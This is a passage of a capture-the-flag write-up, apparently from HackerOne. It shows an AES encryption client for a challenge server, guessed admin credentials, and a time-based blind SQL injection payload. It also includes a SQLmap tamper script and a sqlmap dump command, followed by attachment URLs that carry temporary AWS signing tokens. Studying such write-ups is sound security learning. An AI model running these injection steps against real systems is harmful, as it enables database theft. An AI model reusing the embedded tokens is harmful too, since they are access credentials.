class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecryptKey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e\n        \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eivkey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;b\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epkcs5Pad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecryptKey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eivkey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ebase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eb64encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eivkey\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ebase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eb64decode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecryptKey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eivkey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003epkcs5Unpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003e__name__\u003c/span\u003e\u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;__main__\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eEncryptionH1\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003er\u0026#39;\u0026#39;\u0026#39;{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;test\u0026quot;,\u0026quot;cmd\u0026quot;:\u0026quot;getTemp\u0026quot;}\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003es\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;d\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n    \u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003es\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe Python script encrypts a JSON object, prepends the IV to the encrypted string and base64 encodes the final string. \u003c/p\u003e\n\n\u003cp\u003eAfter a few login attempts with various passwords, I obtained access to the application with the \u003ccode\u003eadmin:password\u003c/code\u003e credentials and received the following response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;temperature\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e73\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stage-3-exfiltration\"\u003eStage 3 - Exfiltration\u003c/h2\u003e\n\n\u003cp\u003eAfter authenticating successfully and testing the \u003ccode\u003egetTemp\u003c/code\u003e and \u003ccode\u003esetTemp\u003c/code\u003e commands, I realized that I was probably in a rabbit hole, so I stepped back to test the login function.\u003c/p\u003e\n\n\u003cp\u003eThe application returned an error when a single quote was injected in the value of the \u003ccode\u003eusername\u003c/code\u003e field:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever, with two single quotes, no errors were returned. The payload \u003ccode\u003e\u0026#39; OR sleep(10)--\u003c/code\u003e was then injected and a 10 second delay occurred. A couple of tests later, I concluded that I was dealing with a time-based blind SQL injection. \u003c/p\u003e\n\n\u003cp\u003eIn order to speed things up, I wanted to automate the attack to see what was hiding in the database. To do so, I wrote a SQLmap tamper script that would encrypt and encode the SQLi payloads:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ebase64\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Cipher\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003elib.core.enums\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003ePRIORITY\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003e__priority__\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ePRIORITY\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eLOWEST\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\n    \u003cspan class=\"n\"\u003epkcs5Pad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epkcs5Pad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;b\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ebase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eb64encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eiv\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003etamper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003ekwargs\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003er\u0026#39;\u0026#39;\u0026#39;{\u0026quot;username\u0026quot;:\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003es\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;cmd\u0026quot;:\u0026quot;getTemp\u0026quot;}\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI executed SQLmap and left it running as there was a lot of content to exfiltrate:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003esqlmap \u003cspan class=\"nt\"\u003e-r\u003c/span\u003e sql.txt \u003cspan class=\"nt\"\u003e--tamper\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e./tamper_script.py \u003cspan class=\"nt\"\u003e--dump\u003c/span\u003e \u003cspan class=\"nt\"\u003e--technique\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eT\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003esql.txt\u003c/code\u003e file contained the request needed to be processed by SQLmap:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: 35.243.186.41\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\nd=*\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"sqlmap-tamper-h1-2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/899/e4577c9462e4320cd27d8b1cacfeaea9a7b9b589/sqlmap-tamper-h1-2.png?response-content-disposition=attachment%3B%20filename%3D%22sqlmap-tamper-h1-2.png%22%3B%20filename%2A%3DUTF-8%27%27sqlmap-tamper-h1-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=82a3180eb2c9565fe0adce6bcd4905a5a1bd48d41239b31af216e0d1e45a9605\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/899/e4577c9462e4320cd27d8b1cacfeaea9a7b9b589/sqlmap-tamper-h1-2.png?response-content-disposition=attachment%3B%20filename%3D%22sqlmap-tamper-h1-2.png%22%3B%20filename%2A%3DUTF-8%27%27sqlmap-tamper-h1-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp